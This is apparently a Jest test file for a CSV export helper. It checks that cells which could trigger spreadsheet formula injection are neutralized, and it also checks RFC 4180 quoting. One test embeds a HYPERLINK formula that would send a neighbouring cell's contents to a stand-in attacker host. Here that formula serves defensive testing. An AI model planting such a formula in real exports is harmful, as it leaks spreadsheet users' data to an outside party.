const { csvCell, toCsv } = require('../../src/utils/csv');

describe('csvCell — spreadsheet formula injection', () => {
  // PRISM exports free-text the user typed (ticket titles, contact names,
  // notes). Excel / LibreOffice / Sheets evaluate any cell starting with one
  // of these, so an exported ticket title can exfiltrate the row beside it.
  it.each(['=', '+', '-', '@'])('neutralizes a leading "%s"', (lead) => {
    expect(csvCell(`${lead}HYPERLINK("http://x/","c")`)).toMatch(/^"?'/);
  });

  it('neutralizes leading tab and carriage return, which also trigger evaluation', () => {
    expect(csvCell('\tcmd')).toContain("'");
    expect(csvCell('\rcmd')).toContain("'");
  });

  it('prefixes a real-world exfiltration payload', () => {
    const payload = '=HYPERLINK("http://attacker.example/?d="&A1,"Click me")';
    const out = csvCell(payload);
    expect(out).toContain("'=HYPERLINK");
  });

  it('leaves ordinary text untouched', () => {
    expect(csvCell('Printer jam in Accounting')).toBe('Printer jam in Accounting');
    expect(csvCell('reboot -f mentioned mid-sentence')).toBe('reboot -f mentioned mid-sentence');
  });

  it('renders null and undefined as empty', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});

describe('csvCell — RFC 4180 quoting', () => {
  it('quotes values containing a comma', () => {
    expect(csvCell('Smith, John')).toBe('"Smith, John"');
  });

  it('doubles embedded quotes', () => {
    expect(csvCell('He said "hi"')).toBe('"He said ""hi"""');
  });

  it('quotes values containing newlines', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
  });
});

describe('toCsv', () => {
  // The previous implementation escaped each cell, then escaped the whole row
  // again, so anything containing a comma came out as """a,b""".
  it('escapes each cell exactly once', () => {
    const csv = toCsv(['Name'], [['Smith, John']]);
    expect(csv).toBe('Name\r\n"Smith, John"');
    expect(csv).not.toContain('"""');
  });

  it('emits CRLF line endings with a header row', () => {
    expect(toCsv(['A', 'B'], [['1', '2'], ['3', '4']])).toBe('A,B\r\n1,2\r\n3,4');
  });

  it('escapes header labels too', () => {
    expect(toCsv(['Total, USD'], [])).toBe('"Total, USD"');
  });
});
